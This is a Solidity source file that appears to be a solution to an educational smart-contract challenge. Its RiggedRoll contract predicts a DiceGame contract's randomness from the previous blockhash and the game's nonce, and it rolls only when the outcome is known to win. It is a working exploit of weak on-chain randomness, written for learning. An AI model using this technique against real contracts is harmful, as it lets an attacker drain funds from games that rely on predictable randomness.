pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

// Exercise solver: <iamdoraemon.eth>
contract RiggedRoll is Ownable {
    DiceGame public diceGame;

    /*
    This is the constructor function of the `RiggedRoll` contract. It takes an address of a `DiceGame` contract as a parameter and assigns it to the `diceGame` variable. This allows the RiggedRoll` contract to interact with the `DiceGame` contract by calling its functions and accessing its state variables. The `diceGameAddress` parameter is declared as `payable` to allow the `RiggedRoll` contract to send ether to the `DiceGame` contract when calling its `rollTheDice` function.
     */
    constructor(address payable diceGameAddress) {
        diceGame = DiceGame(diceGameAddress);
    }

    /**
     * This function allows the owner to withdraw a specified amount of Ether from the contract and
     * transfer it to a specified address.
     * @param _addr - The address parameter is the Ethereum address of the account that will receive the withdrawal amount.
     * @param _amount `_amount` is the amount of ether to be withdrawn.
     */
    function withdraw(address _addr, uint256 _amount) public onlyOwner {
        (bool success, bytes memory data) = _addr.call{value: _amount}("");
        require(success, "Withdraw failed");
    }

    /**
     *The function performs a rigged roll in a dice game by generating a random  number and executing a roll if the number is within a certain range.
     */
    function riggedRoll() public {
        require(address(this).balance >= 0.002 ether, "Insufficient balance");

        uint256 nonce = diceGame.nonce();
        bytes32 prevHash = blockhash(block.number - 1);
        bytes32 hash = keccak256(
            abi.encodePacked(prevHash, address(diceGame), nonce)
        );
        uint256 roll = uint256(hash) % 16;

        if (roll <= 2) {
            diceGame.rollTheDice{value: 0.002 ether}();
        }
    }

    /* 
    The `receive()` function is a special function in Solidity that is executed when the contract  receives ether without any function being called. The `external` keyword means that the function can only be called from outside the contract, and the `payable` keyword means that the function can receive ether. In this case, the function is empty, so it simply allows the contract to receive ether without any additional logic. 
   */
    receive() external payable {}
}
